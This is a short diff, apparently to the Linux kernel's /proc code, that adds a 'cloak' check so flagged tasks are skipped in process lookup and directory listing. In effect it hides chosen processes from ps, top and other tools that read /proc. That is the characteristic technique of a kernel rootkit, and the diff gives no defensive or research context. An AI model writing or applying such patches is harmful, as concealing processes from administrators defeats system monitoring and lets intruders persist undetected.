@@ -111,6 +111,7 @@
  *	The classic example of a problem is opening file descriptors
  *	in /proc for a task before it execs a suid executable.
  */
+#include<linux/cloak.h>
 
 static u8 nlink_tid __ro_after_init;
 static u8 nlink_tgid __ro_after_init;
@@ -3357,6 +3358,8 @@ struct dentry *proc_pid_lookup(struct dentry *dentry, unsigned int flags)
 			goto out_put_task;
 	}
 
+	if (hidden_flag && (task->cloak==1)) goto out_put_task;
+
 	result = proc_pid_instantiate(dentry, task, NULL);
 out_put_task:
 	put_task_struct(task);
@@ -3431,6 +3434,8 @@ int proc_pid_readdir(struct file *file, struct dir_context *ctx)
 		cond_resched();
 		if (!has_pid_permissions(fs_info, iter.task, HIDEPID_INVISIBLE))
 			continue;
+		
+		if (hidden_flag && (iter.task->cloak==1)) continue;
 
 		len = snprintf(name, sizeof(name), "%u", iter.tgid);
 		ctx->pos = iter.tgid + TGID_OFFSET;
